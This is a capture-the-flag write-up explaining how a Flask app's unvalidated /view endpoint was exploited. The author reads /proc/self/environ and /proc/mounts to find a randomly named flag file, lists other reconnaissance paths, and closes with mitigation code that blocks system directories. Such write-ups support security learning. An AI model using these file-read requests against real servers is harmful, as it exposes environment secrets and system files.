# Flask LFI CTF Challenge Writeup

## Challenge Overview

This CTF challenge presents a Flask web application with a Hatsune Miku chat interface. The challenge provides source code files including a Dockerfile that reveals the flag's location strategy.

**Challenge URL:** `https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337`

## Provided Files

The challenge included several files:

1. **docker-compose.yml** - Basic Docker Compose configuration
2. **app.py** - Flask application with the vulnerability
3. **miku.js** - Frontend JavaScript (red herring)
4. **Dockerfile** - Container build instructions (crucial for flag location)

## Initial Analysis

### Vulnerability Identification

Examining the Flask application (`app.py`), we immediately identify a critical Local File Inclusion (LFI) vulnerability:

```python
@app.route('/view')
def view():
    filename = request.args.get('filename')
    if not filename:
        return "Filename is required", 400
    try:
        with open(filename, 'r') as file:
            content = file.read()
        return content, 200
    except FileNotFoundError:
        return "File not found", 404
    except Exception as e:
        return f"Error: {str(e)}", 500
```

**Key Issues:**
- No input validation or sanitization
- Direct file path concatenation
- Allows reading arbitrary files on the server

### Critical Dockerfile Analysis

The provided Dockerfile contains the key information about flag placement:

```dockerfile
FROM python:3.11-slim
RUN pip install --no-cache-dir flask==3.1.1
WORKDIR /app
COPY app .
RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt && \
 chown -R nobody:nogroup /app
USER nobody
EXPOSE 5000
CMD ["python", "app.py"]
```

**Critical Discovery:**
- The original `flag.txt` gets moved to `/flag-[32 random alphanumeric characters].txt`
- The filename is generated using `/dev/urandom` during the Docker build process
- The flag is located in the root directory (`/`)

This immediately tells us that:
1. We have an LFI vulnerability to exploit
2. The flag exists but with a randomized 32-character filename
3. We need to find a way to discover the exact filename since brute forcing 32 alphanumeric characters isn't feasible

## Exploitation Process

### Step 1: Confirm the Vulnerability

First, we verify the LFI vulnerability works by reading the application's own source code:

```
https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337/view?filename=app.py
```

This successfully returns the Flask application code, confirming the vulnerability is exploitable.

### Step 2: The Challenge - Finding the Random Filename

Since we know from the Dockerfile that the flag is at `/flag-[32 random chars].txt`, the challenge becomes: **How do we discover the exact filename without being able to list directories?**

Standard approaches won't work:
- Can't use wildcards: `/flag-*` 
- Can't list directories directly
- Brute forcing 32 alphanumeric characters = 62^32 possibilities (impossible)

### Step 3: System Reconnaissance for Filename Discovery

We need to find a way to discover the filename through available system information. Let's gather intel:

**Environment Variables:**
```
https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337/view?filename=/proc/self/environ
```

**Process Information:**
```
https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337/view?filename=/proc/self/maps
```

### Step 4: The Solution - Using /proc/mounts

The key insight is to check the filesystem mount information:

```
https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337/view?filename=/proc/mounts
```

**Critical Output:**
```
overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/...
...
/dev/nvme0n1p1 /flag-jhGF9BS1wqrxTMFyguPZXWl8cFYBnYaG.txt ext4 ro,relatime,commit=30 0 0
...
```

**BINGO!** The `/proc/mounts` file reveals that the flag file is mounted directly:
- **Filename:** `/flag-jhGF9BS1wqrxTMFyguPZXWl8cFYBnYaG.txt`

### Step 5: Flag Extraction

With the exact filename discovered, we can now read the flag:

```
https://my-flask-app-jnkzwxoah3tl.chals.sekai.team:1337/view?filename=/flag-jhGF9BS1wqrxTMFyguPZXWl8cFYBnYaG.txt
```

## Key Techniques Used

1. **Local File Inclusion (LFI) Exploitation**
   - Direct file reading through unvalidated user input
   - Leveraging the `/view` endpoint vulnerability

2. **Source Code Analysis**
   - Understanding the Dockerfile to identify the flag placement strategy
   - Recognizing the challenge: finding a randomized filename

3. **Linux /proc Filesystem Reconnaissance**
   - Using `/proc/mounts` to discover mounted filesystems
   - Leveraging system metadata when directory listing isn't available

4. **Problem-Solving Approach**
   - Identifying the core challenge (random filename discovery)
   - Finding creative solutions using available system information

## Why /proc/mounts Worked

The `/proc/mounts` technique worked because:
1. **Container Behavior:** The flag file gets mounted as part of the container filesystem
2. **System Visibility:** `/proc/mounts` shows all mounted filesystems, including individual files
3. **No Directory Listing Required:** We can see the filename without needing directory traversal permissions

## Alternative Discovery Methods

Other potential approaches that could work in similar scenarios:
- `/proc/self/fd/` - Check file descriptors
- `/var/log/` files - Look for build or system logs
- `/proc/self/environ` - Check for environment variables containing the filename
- Memory dumps or process information

## Mitigation Strategies

### For this Vulnerability:
1. **Input Validation:** Implement strict validation on the `filename` parameter
2. **Path Sanitization:** Use `os.path.abspath()` and restrict access to specific directories
3. **Allowlist Approach:** Only allow access to predefined files
4. **Remove Sensitive System Access:** Block access to `/proc/` and other sensitive directories

### Example Secure Implementation:
```python
import os
from pathlib import Path

ALLOWED_DIR = "/app/public"
BLOCKED_PATTERNS = ["/proc/", "/sys/", "/dev/", "/etc/"]

@app.route('/view')
def view():
    filename = request.args.get('filename')
    if not filename:
        return "Filename is required", 400
    
    # Block sensitive paths
    for pattern in BLOCKED_PATTERNS:
        if pattern in filename:
            return "Access denied", 403
    
    # Sanitize and validate path
    safe_path = os.path.join(ALLOWED_DIR, filename)
    safe_path = os.path.abspath(safe_path)
    
    # Ensure path is within allowed directory
    if not safe_path.startswith(os.path.abspath(ALLOWED_DIR)):
        return "Access denied", 403
        
    try:
        with open(safe_path, 'r') as file:
            content = file.read()
        return content, 200
    except FileNotFoundError:
        return "File not found", 404
```

## Lessons Learned

1. **Read All Provided Files:** The Dockerfile contained crucial information about the challenge structure
2. **System Information is Powerful:** The `/proc` filesystem can reveal sensitive details even when directory listing is blocked
3. **Container Security:** File mounting behaviors in containers can expose information
4. **Creative Problem Solving:** When obvious approaches fail, system-level reconnaissance can provide alternatives
5. **Defense in Depth:** Blocking the LFI is important, but also block access to sensitive system information

## Challenge Design Insights

This was a well-designed challenge because:
- **Realistic Vulnerability:** LFI vulnerabilities are common in web applications
- **Red Herring:** The Miku chat interface distracted from the real vulnerability
- **Progressive Difficulty:** Required both identifying the vulnerability AND solving the filename discovery problem
- **System Knowledge:** Tested understanding of Linux filesystem and container behavior

The challenge taught that even when you find a vulnerability, additional creative thinking may be required to fully exploit it.

## Tools and Resources

- **Browser Developer Tools:** For testing HTTP requests
- **curl/wget:** For command-line testing  
- **Linux /proc filesystem documentation:** Understanding system information exposure
- **Docker documentation:** Understanding container behavior and file mounting
- **Source code analysis:** Critical for understanding the challenge structure